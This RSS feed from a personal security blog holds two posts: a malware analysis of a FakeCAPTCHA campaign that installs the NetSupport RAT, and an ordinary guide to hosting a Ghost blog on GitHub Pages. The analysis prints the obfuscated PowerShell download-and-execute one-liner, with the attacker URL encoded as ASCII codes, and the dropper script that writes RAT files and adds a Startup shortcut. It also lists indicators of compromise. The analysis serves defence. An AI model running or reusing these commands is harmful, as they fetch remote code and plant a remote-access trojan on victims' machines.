<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Systems, Software and Security]]></title><description><![CDATA[Thoughts, stories and ideas.]]></description><link>simon-kruik.github.io//</link><image><url>simon-kruik.github.io//favicon.png</url><title>Systems, Software and Security</title><link>simon-kruik.github.io//</link></image><generator>Ghost 5.125</generator><lastBuildDate>Sun, 29 Jun 2025 17:32:41 GMT</lastBuildDate><atom:link href="simon-kruik.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Attack Chain Investigation: FakeCAPTCHA to RAT Install]]></title><description><![CDATA[<h2 id="providing-proof-of-humanity">Providing &quot;Proof of Humanity&quot;</h2><p>With the increase of DeepFakes and AI Chatbots being used to mimic human interactions, identifying actual people is becoming more important in all areas of the web. There are many different approaches to this: from Sam Altman&apos;s <a href="https://world.org/world-id?ref=localhost" rel="noreferrer">World ID</a> which uses &quot;</p>]]></description><link>simon-kruik.github.io//attack-chain-investigation-fakecaptcha-to-rat-install/</link><guid isPermaLink="false">684fe4e403405b0f2b969a78</guid><dc:creator><![CDATA[Simon Kruik]]></dc:creator><pubDate>Sun, 29 Jun 2025 16:57:34 GMT</pubDate><media:content url="simon-kruik.github.io//content/images/2025/06/FakeCAPTCHA_AttackChain.drawio-1.png" medium="image"/><content:encoded><![CDATA[<h2 id="providing-proof-of-humanity">Providing &quot;Proof of Humanity&quot;</h2><img src="simon-kruik.github.io//content/images/2025/06/FakeCAPTCHA_AttackChain.drawio-1.png" alt="Attack Chain Investigation: FakeCAPTCHA to RAT Install"><p>With the increase of DeepFakes and AI Chatbots being used to mimic human interactions, identifying actual people is becoming more important in all areas of the web. There are many different approaches to this: from Sam Altman&apos;s <a href="https://world.org/world-id?ref=localhost" rel="noreferrer">World ID</a> which uses &quot;The Orb&quot; to capture and verify biometrics, to commercial offerings like <a href="https://en.wikipedia.org/wiki/ID.me?ref=localhost" rel="noreferrer">ID.me</a> which rely on user submission of government-issued IDs, but maybe the most commonly encountered across a variety of services is the humble <strong>CAPTCHA </strong>(<strong>C</strong>ompletely <strong>A</strong>utomated <strong>P</strong>ublic <strong>T</strong>uring Test to tell <strong>C</strong>omputers and <strong>H</strong>umans <strong>A</strong>part).</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="simon-kruik.github.io//content/images/2025/06/image.png" class="kg-image" alt="Attack Chain Investigation: FakeCAPTCHA to RAT Install" loading="lazy" width="582" height="144"><figcaption><span style="white-space: pre-wrap;">An example of the &quot;CAPTCHA&quot; box on the infected site</span></figcaption></figure><p>These generally start with a simple checkbox, but will then sometimes prompt human verification via correctly identifying distorted letters, transcribing audio or completing a series of image identification challenges (with often frustratingly vague criteria). But what happens when this common and benign &apos;human verification task&apos; is altered and weaponised by a threat actor?</p><h2 id="the-pledge1-just-one-extra-step">The Pledge<sup>[1]</sup>: <em>Just one extra step...</em></h2><p>The &apos;FakeCAPTCHA&apos; launches<sup>[2]</sup> as soon as you hit any page on a compromised web server (and in fact overlays the original webpage which still loads, presumably to help minimise any obvious changes in visitor traffic to the original site). However after clicking the checkbox, an error pops up:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="simon-kruik.github.io//content/images/2025/06/image-1.png" class="kg-image" alt="Attack Chain Investigation: FakeCAPTCHA to RAT Install" loading="lazy" width="928" height="456" srcset="simon-kruik.github.io//content/images/size/w600/2025/06/image-1.png 600w, simon-kruik.github.io//content/images/2025/06/image-1.png 928w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">The error message, instructing &apos;legitimate users&apos; to paste a code into the Run tool</span></figcaption></figure><p>This sentence &quot;Unusual Web Traffic Detected&quot; occurs legitimately for those who browse the web with a VPN connected, or use TOR, as it is often due to your device sharing an IP address with automated tools, bots or scrapers. This extra step however deviates from the norm - in both this and other observed examples it presents instructions to verify your identity using an inbuilt tool in Windows and send a code. This pattern is familiar to those used to using a one-time code (&quot;nonce&quot;) for use in multi-factor authentication systems, password resets, or email verification. This mix and match of existing and novel components helps ensure the victim might be convinced that this request is a new version of previously seen CAPTCHAs. </p><h2 id="the-turn-not-what-it-says-on-the-tin">The Turn: <em>Not what it says on the tin</em></h2><p>The first malicious behaviour we see is the &quot;Copy&quot; button on the verification code section. While it looks equivalent to many other technical documentation sites which have the same function, it actually decodes a base64 string and places that in your clipboard instead.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="simon-kruik.github.io//content/images/2025/06/image-2.png" class="kg-image" alt="Attack Chain Investigation: FakeCAPTCHA to RAT Install" loading="lazy" width="385" height="136"><figcaption><span style="white-space: pre-wrap;">Clipboard history displaying the actual effect of the Copy button</span></figcaption></figure><p>The string is a little bit obfuscated as you can see here:</p><pre><code>powershell -w h -nop -c &quot;$e=(@(104,116,116,112,115,58,47,47,118,101,114,105,102,105,110,116,99,111,110,46,99,111,109,47,49,46,116,120,116)|%{[char]$_})-join&apos;&apos;;$y=New-Object Net.WebClient;$u=$y.(&apos;DownloadStri&apos;+&apos;ng&apos;)($e);$i=&apos;i&apos;+&apos;e&apos;+&apos;x&apos;;&amp;$i $u&quot;
</code></pre><p>Put simply, this command downloads a file from the URL  (made up of the ASCII codes above) <em>https:// verifintcon [.] com/1.txt </em>and executes it in a hidden Powershell window without a profile (meaning no custom scripts). So, let&apos;s look at the contents of the downloaded Powershell file:</p><blockquote>$ErrorActionPreference=&apos;Stop&apos;;$ojftLp=&apos;eyJwYXRocyI6WyJBdWRpb0NhcHR1cmUuZGxsIiwiY2...&lt;9,714,825 characters&gt;...GVEaGNxTHFBQUFBQUE9PSJdfQ==&apos;==&apos;;$ptCuIqwFE=[System.Text.Encoding]::UTF8.GetString([System.Convert]::<strong>FromBase64String</strong>($ojftLp));$hNHwwvpT=<strong>ConvertFrom-Json </strong>$ptCuIqwFE;$wBZiLfRoT=<strong>Join-Path $env:AppData &apos;FZlhFAy</strong>&apos;;[IO.Directory]::CreateDirectory($wBZiLfRoT)|Out-Null;for($lTkdkWq=0;$lTkdkWq -lt $hNHwwvpT.paths.Count;$lTkdkWq++){$eKCEjGQgX=$hNHwwvpT.paths[$lTkdkWq];$LKMlDIY=[System.Convert]::FromBase64String($hNHwwvpT.data[$lTkdkWq]);$MRQZHFLA=Join-Path $wBZiLfRoT $eKCEjGQgX;$tyXPYtKPrf=[System.IO.Path]::GetDirectoryName($MRQZHFLA);if(-not(Test-Path $tyXPYtKPrf)){New-Item -Type Directory -Path $tyXPYtKPrf|Out-Null}[System.IO.File]::<strong>WriteAllBytes</strong>($MRQZHFLA,$LKMlDIY);}$oxyNFIQQ=New-Object -ComObject WScript.Shell;$fgWVKoq=$oxyNFIQQ.<strong>CreateShortcut</strong>((Join-Path $wBZiLfRoT &apos;RuivQswX.lnk&apos;));$fgWVKoq.TargetPath=Join-Path $wBZiLfRoT &apos;client32.exe&apos;;$fgWVKoq.WorkingDirectory=$wBZiLfRoT;$fgWVKoq.WindowStyle=7;$fgWVKoq.Save();$acZpyja=Join-Path ($<strong>env:APPDATA+&apos;\Microsoft\Windows\Start Menu\Programs\Startup</strong>&apos;) &apos;RuivQswX.lnk&apos;;$olnNnlh=$oxyNFIQQ.CreateShortcut($acZpyja);$olnNnlh.TargetPath=Join-Path $wBZiLfRoT &apos;client32.exe&apos;;$olnNnlh.WorkingDirectory=$wBZiLfRoT;$olnNnlh.WindowStyle=7;$olnNnlh.Save();<strong>Start-Sleep -Seconds 3;Invoke-Expression (&apos;cmd /c rundll32.exe shell32.dll,ShellExec_RunDLL &quot;&apos;+$acZpyja+&apos;&quot;&apos;);Write-Host &apos;Done&apos;</strong></blockquote><p>There&apos;s a lot of it, and both the data and variable names are clearly obfuscated, this time the data is base64 encoding of a JSON file which decoded has this first line:</p><blockquote>{&quot;paths&quot;:[&quot;AudioCapture.dll&quot;,&quot;client32.exe&quot;,&quot;client32.ini&quot;,&quot;HTCTL32.DLL&quot;,<br>&quot;msvcr100.dll&quot;,&quot;nskbfltr.inf&quot;,&quot;NSM.LIC&quot;,&quot;nsm_vpro.ini&quot;,&quot;pcicapi.dll&quot;,<br>&quot;PCICHEK.DLL&quot;,&quot;PCICL32.DLL&quot;,&quot;remcmdstub.exe&quot;,&quot;TCCTL32.DLL&quot;],<br>&quot;data&quot;:[&quot;TVqQAAMAAAAEAAAA//8AA...</blockquote><p>Clearly a list of filenames, followed by an array of data to put into them. That helps us understand the context of the powershell command - following the sections in bold - it:</p><ol><li>Decodes the data from Base64</li><li>Converts it from JSON into a Powershell object</li><li>Adds to the file paths the local AppData folder and sub-folder <code>FZlhFAy</code></li><li>Writes the bytes of the files to said folder</li><li>Creates a shortcut to the &quot;client32.exe&quot; application</li><li>Puts the shortcut in the Windows Startup folder for persistence</li><li>Waits 3 seconds, and then runs the shortcut and writes &quot;Done&quot;</li></ol><p>Two things that are worth noting here:</p><ul><li>None of this code is unique to the request of the original website, and none of it appears to communicate back to said webpage, so the original user is stuck with the FakeCAPTCHA unfulfilled and the webpage still inaccessible - something that may arouse suspicion. Unlike more complex trojans, this doesn&apos;t achieve it&apos;s stated purpose in addition to staging a further tool.</li><li>In the JSON file&apos;s paths array, we clearly see &quot;NSM.lic&quot; which is a NetSupport License file, and it&apos;s contents show the NSM Serial Number <code>NSM212937</code>. This is a well-known Remote Access Tool (RAT) that can be used to exfiltrate existing data, pivot to other devices on the network or monitor steal passwords/secrets pasted to the clipboard.</li></ul><h2 id="the-prestige-wrapping-it-up">The Prestige: <em>Wrapping it up</em></h2><figure class="kg-card kg-image-card kg-card-hascaption"><img src="simon-kruik.github.io//content/images/2025/06/FakeCAPTCHA_AttackChain.drawio.png" class="kg-image" alt="Attack Chain Investigation: FakeCAPTCHA to RAT Install" loading="lazy" width="770" height="445" srcset="simon-kruik.github.io//content/images/size/w600/2025/06/FakeCAPTCHA_AttackChain.drawio.png 600w, simon-kruik.github.io//content/images/2025/06/FakeCAPTCHA_AttackChain.drawio.png 770w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Attack Chain Diagram </span></figcaption></figure><p>The nature of the RAT is such that it can be utilised for a variety of malicious purposes meaning there&apos;s not an obvious behaviour to detect. There are however, a variety of indicators that can be reported and monitored.</p><p>Indicators of Compromise (IOCs):</p><ul><li>Traffic contacting <code>thankyoumykio [.] com:443</code>, <code>deepholeintheworld [.] com:443</code>, and <code>83.222.190.174</code> - all used for communication to/from the RAT. These sites may be compromised sites or originals, and are hosted by the network provider SS-Net in Bulgaria. A copy of these findings and a takedown request was sent to the provider.</li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="simon-kruik.github.io//content/images/2025/06/image-3.png" class="kg-image" alt="Attack Chain Investigation: FakeCAPTCHA to RAT Install" loading="lazy" width="629" height="268" srcset="simon-kruik.github.io//content/images/size/w600/2025/06/image-3.png 600w, simon-kruik.github.io//content/images/2025/06/image-3.png 629w"><figcaption><span style="white-space: pre-wrap;">The NetSupport Config File showing the above IOCs</span></figcaption></figure><ul><li>A powershell download from <code>https:// verifintcon [.] com/1.txt</code>, the obfuscated data file. This seems to be the front-end for (ironically) a Cloudflare R2 public bucket hosting the file. This was reported to Cloudflare&apos;s Abuse team, and via their bug bounty program, however since the original site didn&apos;t fall under their scope, and it &quot;does not pose a concrete and exploitable risk&quot; they refused to take any action. &#x1F9B6;&#x1F52B;&#x2601;&#xFE0F;<sup>[3]</sup></li><li>NetSupport Manager is relatively well-known for it&apos;s use as a malicious RAT, and their support was very helpful in confirming that this installation is using a outdated cracked version. Any legitimate version would be updated and with a different configuration, therefore an indicator is finding files in:<ul><li><code>AppData\Roaming\FZlhFAy</code> with the following MD5 hashes:<ul><li>client32.exe: <code>290c26b1579fd3e48d60181a2d22a287</code></li><li>client32.ini: <code>6fb2724011abc37646ac6288faa8e9bf</code></li></ul></li><li>A shortcut in <code>AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> with this MD5 hash<ul><ul><li>RuivQswX.lnk: <code>38c6cab1de02c1918bf0e1f77c0c2c3d</code></li><li>Notably, even if an existing Anti-Virus detects and quarantines the NetSupport Manager application (.exe), this shortcut will likely remain and provide evidence that the phishing attempt was successful.</li></ul></ul></li></ul></li><li>One of the things I have been unable to find is a good indicator for compromised servers on which this FakeCAPTCHA is being deployed - this could potentially be used in tools like the Shodan Search Engine to find other compromised servers and notify the owners. As it is, one other compromised server was found from the original, and both server owners were contacted and informed of the issue.</li></ul><p>Given the relative simplicity of the attack chain, the ubiquity of CAPTCHAs and other interruptive dialogues (paywalls, cookies settings panels, etc.) and the lack of concern by the major parties involved, I can only expect we&apos;ll see more attacks like this in the future. Like most phishing attacks, the strongest defence is training users - in this case, to set good boundaries/expectations about what behaviour a website should ask of you, something both technical and non-technical staff alike can be prepared for.</p><h3 id="footnotes">Footnotes</h3><p>[1] These heading prefixes are taken from the elements of a magic illusion described in The Prestige</p><p>[2] The page presented for the FakeCAPTCHA is actually quite interesting - it uses a lot of static assets, presumably to not alert the website it&apos;s impersonating, but generates a new &apos;unique id&apos; at the bottom of the page each time, and up until the extra step has no obvious grammar or graphical errors to tell it apart from a standard CAPTCHA<br><br>[3] Emoji Translation: Cloudflare shooting themselves in the foot.</p>]]></content:encoded></item><item><title><![CDATA[Setting up a blog using Ghost and GitHub Pages]]></title><description><![CDATA[<h2 id="choosing-your-technology">Choosing your technology</h2><p>With the wide array of blog hosting sites and technologies available, choosing one can be a pretty daunting task. The main factors I looked at when considering the options available were:</p><ul><li>Peer approval: Did people I know and trust have good experiences with it?</li><li>Ongoing cost: Can</li></ul>]]></description><link>simon-kruik.github.io//setting-up-a-blog-using-ghost-and-github-pages/</link><guid isPermaLink="false">684e94466a311709457c14e6</guid><category><![CDATA[systems]]></category><dc:creator><![CDATA[Simon Kruik]]></dc:creator><pubDate>Sat, 24 Oct 2020 07:57:00 GMT</pubDate><content:encoded><![CDATA[<h2 id="choosing-your-technology">Choosing your technology</h2><p>With the wide array of blog hosting sites and technologies available, choosing one can be a pretty daunting task. The main factors I looked at when considering the options available were:</p><ul><li>Peer approval: Did people I know and trust have good experiences with it?</li><li>Ongoing cost: Can I minimise cost, or even get it hosted for free?</li><li>Ease-of-use: Is it easy to setup, maintain and add to?</li></ul><h4 id="hosting-provider">Hosting Provider</h4><p>Many of my colleagues who work in IT have their own servers or <a href="https://en.wikipedia.org/wiki/Virtual_private_server?ref=localhost">VPSs, </a>and I&apos;ve been privy to many rants about having to update or migrate servers due to security issues or their preferred applications losing support. However one of my colleagues had recently moved their website from their VPS onto <a href="https://pages.github.com/?ref=localhost">GitHub Pages</a>, a free hosting technology that uses your free GitHub repository to store and server your webpage. It has a few <a href="https://docs.github.com/en/free-pro-team@latest/github/working-with-github-pages/about-github-pages?ref=localhost#usage-limits">limits </a>(1GB Repository, 100GB bandwidth/month), but for a simple blog site, it&apos;s reasonably suitable. By default it hosts your website on https://&lt;GitHub Username&gt;.github.io (note the included TLS - nice!), but can be <a href="https://docs.github.com/en/free-pro-team@latest/github/working-with-github-pages/configuring-a-custom-domain-for-your-github-pages-site?ref=localhost">customised to use your own domain</a>, something that I&apos;m keen to do in the future, to look a bit more professional.</p><h4 id="content-management-system">Content Management System</h4><p>The only real drawback with GitHub Pages is that it doesn&apos;t in-and-of-itself offer an easy way to add and modify content, you&apos;d have to edit the raw HTML/CSS/JS yourself. It does recommend using the static site generator <a href="https://docs.github.com/en/free-pro-team@latest/github/working-with-github-pages/setting-up-a-github-pages-site-with-jekyll?ref=localhost">Jekkyl</a>, which uses markdown syntax to generate blog-style websites. Having used another markdown-based static site generator (<a href="https://blog.getpelican.com/?ref=localhost">Pelican</a>) for my <a href="https://eresearch.uts.edu.au/?ref=localhost">workplace&apos;s website</a>, I understand some of the benefits of this, especially when used with a git repo - git commits allow you to easily see what members have contributed, simple formatting and editing using markdown text files, and intuitive folder-based structures. For a personal website however, I want to be able to quickly and easily add pages full of various types of content, and trust that it&apos;s easily readable on various types of devices. For this reason I chose a <a href="https://en.wikipedia.org/wiki/Content_management_system?ref=localhost">CMS (Content Management System) </a>that I&apos;d seen used to great effect in <a href="https://www.troyhunt.com/its-a-new-blog/?ref=localhost">one of my favourite blogs</a>, and had recommended to me as a good open-source option - <a href="https://ghost.org/?ref=localhost">ghost</a>. It&apos;s a web-based CMS with decent free themes available and supports both basic and markdown formatting as necessary.</p><h5 id="connecting-github-pages-and-ghost">Connecting GitHub Pages and Ghost</h5><p>Unfortunately, because ghost uses <a href="https://ghost.org/docs/concepts/hosting/?ref=localhost#self-hosting">multiple services</a>, such as a database and web-server, it doesn&apos;t easily integrate with GitHub Pages. Luckily though where there&apos;s a will there&apos;s more than likely already a GitHub repository. In this case paladini&apos;s super simple<a href="https://github.com/paladini/ghost-on-github-pages?ref=localhost"> ghost-on-github-pages repo</a>; it guides you through the process of setting up ghost on your macOS or linux machine, then includes some scripts to use the <a href="https://pypi.org/project/buster/?ref=localhost">buster python </a>package to create a static copy of your ghost website and upload it to your GitHub repo. Because my main machine is a Windows box, I installed Ubuntu on it via <a href="https://docs.microsoft.com/en-us/windows/wsl/install-win10?ref=localhost">Windows Subsystem for Linux</a> and the <a href="https://www.microsoft.com/en-us/p/ubuntu/9nblggh4msv6?activetab=pivot%3Aoverviewtab&amp;ref=localhost">Microsoft Store</a>, which allows me to easily use a linux distro without needing to run a full <a href="https://en.wikipedia.org/wiki/Virtual_machine?ref=localhost">VM</a> via VirtualBox. I did run into a few issues, namely that I didn&apos;t have pip installed or available via the default repositories so I had to <a href="https://pip.pypa.io/en/stable/installing/?ref=localhost">install </a>that manually, some of the scripts where unclear as to whether they needed to be run as root or local user, so I had to re-run some with <em>sudo</em> prefixed, and I needed to change the default port in the deploy.sh script. Overall it&apos;s a pretty clean experience that results in a locally-hosted ghost install to write and preview website posts and settings, and then a simple script to run to deploy that website to your GitHub repo. It mimicks a dev/prod environment, which is handy if you want to test-out features/themes without changing your public website.</p><h2 id="where-to-from-here">Where to from here?</h2><p>This system ends up turning out a little <em>jank</em> (one of my favourite types of system), since you&apos;re combining two technologies that were never really designed to be combined, but getting a cheap (free!) solution out of it. It does mean however that there could be breaking changes that totally destroy this workflow in the future, or I could get frustrated with having to spin-up ghost locally everytime I want to change anything on my website. In either case, there&apos;s a few alternatives I&apos;d be interested in looking at:</p><ul><li>A <a href="https://ghost.org/pricing/?ref=localhost">Ghost Pro</a> solution, hosted by the Ghost Foundation. This is a little pricey, but would offer the same nice CMS option, without having to worry about filesize limits or running a local Ghost environment</li><li>Using Jekkyl with GitHub Pages for a more supported solution.</li><li>Hosting a webpage on my own VPS or home server, this is only really viable if I&apos;m also planning to host other services on the same box (e.g. game/media servers, log analysers, home automation solutions), since the support necessary is much larger.</li></ul>]]></content:encoded></item></channel></rss>